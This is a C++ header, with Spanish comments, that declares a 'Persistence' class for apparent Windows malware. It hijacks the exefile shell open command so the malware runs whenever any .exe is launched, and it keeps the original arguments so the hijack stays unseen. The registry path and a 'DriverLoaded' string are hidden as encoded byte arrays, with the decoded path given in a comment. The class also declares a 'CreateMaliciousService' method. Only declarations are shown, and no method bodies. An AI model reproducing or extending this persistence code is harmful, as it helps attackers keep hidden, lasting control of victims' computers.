#pragma once
#include "Executable.h"
#include <iostream>
#include <vector>

class Persistence {
private:
	LPCWSTR currentPath		= Executable::getCurrentPath();

	// Formato requerido para preservar los argumentos del .exe original
	std::wstring newCommand = L"\"" + std::wstring(currentPath) + L"\" \"%1\" %*";

	std::wstring keyPath_str = L"";
	std::wstring driverLoaded_str = L"";

	
public:
	Persistence();

	// Mensaje descifrado: Software\Classes\exefile\shell\open\command
	std::vector<unsigned char> keyPath = { 0x31, 0x4d, 0x44, 0x52, 0x55, 0x3f, 0x50, 0x43, 0x3a, 0x21, 0x4a, 0x3f, 0x51, 0x51, 0x43, 0x51, 0x3a, 0x43, 0x56, 0x43, 0x44, 0x47, 0x4a, 0x43, 0x3a, 0x51, 0x46, 0x43, 0x4a, 0x4a, 0x3a, 0x4d, 0x4e, 0x43, 0x4c, 0x3a, 0x41, 0x4d, 0x4b, 0x4b, 0x3f, 0x4c, 0x42 };
	std::vector<unsigned char> driverLoaded = { 0x22, 0x50, 0x47, 0x54, 0x43, 0x50, 0x2a, 0x4d, 0x3f, 0x42, 0x43, 0x42 };

	
	BOOL StartPersistence();
	BOOL IsRegistryKeyModified();
	BOOL CreateRegistryKey();
	BOOL RegistryKeyModification();
	BOOL CreateMaliciousService(const std::wstring& serviceName, const std::wstring& serviceDisplayName, const std::wstring& servicePath);
};